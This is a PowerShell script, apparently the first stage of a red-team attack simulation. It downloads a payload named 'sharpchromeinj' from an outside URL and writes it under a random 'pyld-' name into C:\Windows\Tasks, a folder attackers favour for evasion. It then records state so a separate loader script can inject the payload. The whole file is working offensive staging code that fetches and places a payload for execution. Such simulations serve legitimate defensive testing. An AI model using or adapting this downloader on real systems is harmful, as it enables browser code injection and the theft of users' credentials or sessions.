$url = "https://app.cymulate.com/api/red-team/resource/sharpchromeinj.txt"


$StateFile = "C:\Windows\Tasks\next_step_sim.txt"
$TasksDir = "C:\Windows\Tasks"

# Function to generate random UID
function Get-RandomUID {
    return [System.Guid]::NewGuid().ToString().Replace("-", "").Substring(0, 16)
}

# Function to save state to file
function Save-State {
    param(
        [hashtable]$State
    )
    
    try {
        $StateJson = $State | ConvertTo-Json -Compress
        $Utf8NoBomEncoding = New-Object System.Text.UTF8Encoding $false
        [System.IO.File]::WriteAllText($StateFile, $StateJson, $Utf8NoBomEncoding)
        Write-Host "[*] State saved to: $StateFile" -ForegroundColor Green
    } catch {
        Write-Host "[!] Error saving state: $($_.Exception.Message)" -ForegroundColor Red
        throw
    }
}

try {
    Write-Host "[*] Step 1: Downloading payload" -ForegroundColor Cyan
    
    # Ensure C:\Windows\Tasks directory exists
    if (-not (Test-Path $TasksDir)) {
        Write-Host "[!] Error: Directory $TasksDir does not exist" -ForegroundColor Red
        exit 1
    }
    
    # Generate random UID for filename
    $RandomUID = Get-RandomUID
    $DownloadPath = "$TasksDir\pyld-$RandomUID.dat"
    
    Write-Host "[*] URL: $url" -ForegroundColor Yellow
    Write-Host "[*] Download path: $DownloadPath" -ForegroundColor Yellow
    
    # Download to file
    $response = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop
    $Content = $response.Content.Trim()
    
    # Save as UTF8 without BOM to avoid encoding issues
    $Utf8NoBomEncoding = New-Object System.Text.UTF8Encoding $false
    [System.IO.File]::WriteAllText($DownloadPath, $Content, $Utf8NoBomEncoding)
    
    if (-not (Test-Path $DownloadPath) -or (Get-Item $DownloadPath).Length -eq 0) {
        Write-Host "[!] Error: Downloaded file is empty or not created" -ForegroundColor Red
        exit 1
    }
    
    $FileSize = (Get-Item $DownloadPath).Length
    Write-Host "[+] Successfully downloaded $FileSize bytes to: $DownloadPath" -ForegroundColor Green
    
    # Save state for next step
    $State = @{
        Step = 1
        DownloadPath = $DownloadPath
        URL = $url
        FileSize = $FileSize
        RandomUID = $RandomUID
    }
    
    Save-State -State $State
    
    Write-Host "[+] Step 1 completed successfully" -ForegroundColor Green
    Write-Host "[*] Next: Run step2_load.ps1" -ForegroundColor Yellow
    
} catch {
    Write-Host "[!] Error in Step 1: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Stack trace: $($_.Exception.StackTrace)" -ForegroundColor Red
    exit 1
}
